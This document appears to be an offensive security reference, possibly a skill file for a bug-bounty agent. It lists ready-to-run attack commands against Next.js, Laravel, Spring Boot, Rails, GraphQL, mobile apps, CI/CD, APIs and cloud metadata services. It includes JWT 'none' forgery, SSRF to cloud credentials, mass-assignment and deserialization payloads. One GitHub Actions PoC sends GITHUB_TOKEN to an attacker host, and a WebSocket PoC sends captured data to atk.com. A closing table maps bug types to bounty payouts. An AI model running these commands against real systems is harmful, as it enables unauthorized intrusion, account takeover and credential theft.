# Advanced Techniques

> A->B chain hunting and exploit chains covered in `../tracks/exploit/SKILL.md`. This file covers framework-specific attacks, mobile, CI/CD, API, and advanced testing techniques.

---

## FRAMEWORK-SPECIFIC ATTACKS

### Next.js
```bash
# Server Actions CSRF -- Origin: null bypass
curl -X POST https://target.com/action -H "Origin: null" -H "Content-Type: application/json" -d '{"action":"deleteAccount"}'
# Image optimizer SSRF via redirect
curl "https://target.com/_next/image?url=https://your-server.com/redirect-to-metadata&w=128&q=75"
# Middleware bypass via _next/data
curl "https://target.com/_next/data/BUILD_ID/admin/dashboard.json"
# Exposed __NEXT_DATA__
curl -s https://target.com/dashboard | grep -o '__NEXT_DATA__.*</script>'
# Rewrites proxy SSRF
curl "https://target.com/api/../../admin/internal-endpoint"
```
Priority: `__NEXT_DATA__` on auth pages, `/_next/image` SSRF, middleware bypass on admin routes.

### Laravel
```bash
curl -s https://target.com/_ignition/health-check     # Debug RCE (CVE-2021-3129)
curl -sI https://target.com/{horizon,telescope,nova,pulse}  # Exposed dashboards
curl -s https://target.com/.env | grep APP_KEY         # Session forging
# Mass assignment
curl -X PUT https://target.com/api/profile -H "Content-Type: application/json" \
  -d '{"name":"x","is_admin":true,"role":"admin","credits":999999}'
```

### Spring Boot
```bash
curl -s https://target.com/actuator/{env,heapdump,configprops,mappings,jolokia/list}
# Alt paths: /manage/env, /admin/actuator/env, /actuator/..;/env
# HeapDump: strings heap.bin | grep -i "password\|secret\|token"
# SpEL injection: curl "https://target.com/api/search?q=${7*7}" -- 49 = RCE
```

### Django
```bash
curl -s https://target.com/{__debug__/,debug/}     # Debug toolbar
curl -s https://target.com/.env | grep SECRET_KEY   # Session forging
# ORM injection via __ lookups
curl "https://target.com/api/users?filter=password__startswith=a"
curl "https://target.com/api/users?order_by=password"  # Boolean oracle
```

### WordPress
```bash
# xmlrpc brute force (WAF bypass -- sends creds in XML body)
curl -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>pass</value></param></params></methodCall>'
curl -s https://target.com/wp-json/wp/v2/users    # User enum
curl -s "https://target.com/?author=1"              # Username via redirect
```

### Rails
```bash
# YAML deserialization (older Rails + psych gem)
curl -X POST https://target.com/api/endpoint -H "Content-Type: application/x-yaml" -d '--- !ruby/object:Gem::Installer i: x'
# Mass assignment
curl -X PATCH https://target.com/api/users/me -H "Content-Type: application/json" -d '{"user":{"admin":true,"role":"superadmin"}}'
curl -s https://target.com/.env | grep SECRET_KEY_BASE  # Session forging
```

### GraphQL
```graphql
# Introspection
{__schema{types{name,fields{name,type{name,kind,ofType{name}}}}}}
# Suggestion abuse (type incomplete query, read errors for field names)
{ use }
# Batched rate limit bypass -- send N login attempts in one request
[{"query":"mutation{login(email:\"v@t.com\",otp:\"0001\"){token}}"},...]
# Alias IDOR
{ a1: user(id:"1"){email} a2: user(id:"2"){email} }
# Mutation auth bypass
mutation { updateUserRole(userId:"victim",role:ADMIN){id role} }
```

---

## MOBILE APP TESTING

### Android
```bash
apktool d target.apk -o target_src && jadx target.apk -d target_jadx
grep -rn "api_key\|secret\|password\|token\|Bearer" target_jadx/
grep -rn "https://\|http://" target_jadx/ | grep -v "google\|android\|schema"
grep -i 'exported="true"' target_src/AndroidManifest.xml
grep -i 'allowBackup="true"\|cleartextTrafficPermitted' target_src/AndroidManifest.xml
grep -rn "loadUrl\|addJavascriptInterface\|setJavaScriptEnabled" target_jadx/
# SSL pinning bypass: objection -g com.target.app explore -> android sslpinning disable
```

### iOS
```bash
strings target.app/target | grep -i "api\|key\|secret\|http\|password\|token"
class-dump -H target.app/target -o headers/
grep -rn "admin\|debug\|hidden\|internal" headers/
plutil -p target.app/Info.plist | grep -i "transport\|scheme\|exception"
# Frida: bypass SSL, jailbreak detection, biometrics
```

### Common Mobile Bugs
| Bug | Where | Impact |
|---|---|---|
| Hardcoded API keys | Decompiled source | Key scope dependent |
| Cert pinning bypass | Frida/objection | MitM all traffic |
| Exported components | AndroidManifest | Launch internal activities |
| Deep link injection | URL scheme handlers | Trigger unauth actions |
| WebView XSS | loadUrl with user input | Cookie theft |
| Backup extraction | allowBackup=true | Extract app data |

---

## CI/CD ATTACKS

### GitHub Actions
```bash
grep -rn "pull_request_target" .github/workflows/       # Dangerous trigger
grep -rn "github.event.pull_request.head" .github/workflows/  # Attacker code checkout
grep -rn '${{ github.event' .github/workflows/ | grep "run:"  # Expression injection
grep -rn "runs-on:.*self-hosted" .github/workflows/      # Runner escape
```
Expression injection PoC: issue title = `test"; curl https://ATK.com/$(echo $GITHUB_TOKEN|base64) #`

### GitLab CI
```bash
grep -rn "docker.sock\|/var/run/docker" .gitlab-ci.yml   # Container escape
grep -rn "include:" .gitlab-ci.yml                        # Supply chain
```

### Jenkins
```bash
curl -sI https://target.com/jenkins/script   # Groovy console = instant RCE
curl -s "https://target.com/jenkins/job/JOB/lastBuild/consoleText"  # Secrets in logs
```

---

## API TESTING

```bash
# Method override
curl -X POST https://target.com/api/admin/users -H "X-HTTP-Method-Override: DELETE"
# Version downgrade
curl -s https://target.com/api/v1/users/me    # Older = weaker auth
# Content-Type confusion
curl -X POST https://target.com/api/login -H "Content-Type: application/xml" -d '<root><user>admin</user></root>'
# Mass assignment
curl -X PATCH https://target.com/api/users/me -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"verified":true,"permissions":["*"]}'
# Pagination dump
curl "https://target.com/api/users?limit=999999&offset=0"
# Parameter pollution
curl "https://target.com/api/transfer?from=attacker&to=victim&amount=100&from=victim"
# JSON duplicate keys
curl -X POST https://target.com/api/transfer -H "Content-Type: application/json" \
  -d '{"user":"attacker","user":"admin"}'
```

### Auth Bypass
```bash
# JWT none algorithm
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' > /tmp/h
echo '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' > /tmp/p
curl -s https://target.com/api/admin -H "Authorization: Bearer $(cat /tmp/h).$(cat /tmp/p)."
# JWT key confusion: RS256->HS256, sign with public key as HMAC secret
# Password reset token prediction: request 5 tokens, check for patterns
# OAuth state parameter: replay callback with different state = CSRF on OAuth
```

---

## TIMING SIDE-CHANNELS

### Source Code Detection
```bash
# UNSAFE comparisons
grep -rn '== token\|== secret\|== hash\|== apiKey' --include="*.{ts,js,py,rb,go}"
# SAFE comparisons (ignore these)
grep -rn 'timingSafeEqual\|hmac.compare_digest\|constant_time_compare\|hmac.Equal\|secure_compare'
# KEY: If safe in 8/10 places but === in 2/10 -> report the 2 inconsistent ones
```

### Blind Measurement
```python
import requests, time, statistics
def measure(url, data, n=50):
    times = []
    for _ in range(n):
        s = time.perf_counter()
        requests.post(url, json=data)
        times.append(time.perf_counter() - s)
    return statistics.median(times)
# >5ms delta between valid-prefix and random token = timing oracle
```

---

## WEBSOCKET TESTING

```bash
wscat -c "wss://target.com/ws"                          # No-auth connect
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"  # CSWSH check
```
Test: IDOR (subscribe to other user channel), XSS in messages, SQLi in params, admin actions.

CSWSH PoC: `<script>var ws=new WebSocket('wss://target.com/ws');ws.onmessage=e=>fetch('https://atk.com/?d='+e.data)</script>`

---

## CLOUD MISCONFIGURATIONS

### AWS
```bash
aws s3 ls s3://TARGET-bucket --no-sign-request
# SSRF metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"
# Test stolen creds
aws sts get-caller-identity && aws s3 ls
```

### GCP
```bash
curl -s "https://TARGET.firebaseio.com/.json"   # Open Firebase
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```bash
curl -s "https://TARGET.blob.core.windows.net/CONTAINER?restype=container&comp=list"
# User enum
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" -d '{"username":"admin@target.com"}'
# Metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### DNS Cloud Detection
```bash
dig +short TARGET.com CNAME   # *.amazonaws.com, *.azurewebsites.net, *.appspot.com
# Dangling DNS = subdomain takeover if CNAME exists but service returns 404/NoSuchBucket
```

---

## RACE CONDITIONS

```python
import asyncio, aiohttp
async def race(url, data, headers, n=20):
    async with aiohttp.ClientSession() as s:
        tasks = [s.post(url, json=data, headers=headers) for _ in range(n)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, r in enumerate(results):
            print(f"{i}: {await r.json() if not isinstance(r, Exception) else r}")
# Race: coupon redeem, balance withdraw, vote/like, file upload
```

| Race Target | Bug | Impact |
|---|---|---|
| Coupon/voucher | Double-spend | Financial |
| Balance operations | Overdraw | Financial |
| Like/vote/follow | Inflated counts | Integrity |
| Invite/referral bonus | Unlimited bonuses | Financial |

---

## CACHE POISONING

```bash
# Identify cached responses
curl -sI "https://target.com/" | grep -i "cache\|age\|x-cache"
# Find unkeyed headers (reflected but not in cache key)
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep "evil.com"
curl -s "https://target.com/" -H "X-Forwarded-Scheme: http" | grep "http://"
# Web Cache Deception (trick cache into storing private data)
curl -s "https://target.com/api/me/profile.css" -H "Cookie: session=VICTIM"
# Then access without cookies to get victim data
```

---

## CVSS QUICK SCORING

| Scenario | CVSS | Payout Range |
|---|---|---|
| Unauth RCE | 9.8 | $10K-$100K+ |
| Auth bypass to admin | 9.1 | $5K-$50K |
| Full ATO chain | 8.0-9.0 | $3K-$30K |
| SSRF to cloud creds | 7.5-9.0 | $2K-$20K |
| IDOR mass data exfil | 7.5-8.5 | $2K-$15K |
| Stored XSS main domain | 6.1-7.5 | $1K-$10K |
| CSRF sensitive action | 5.0-7.0 | $500-$5K |
| Info disclosure | 3.0-5.0 | $200-$2K |
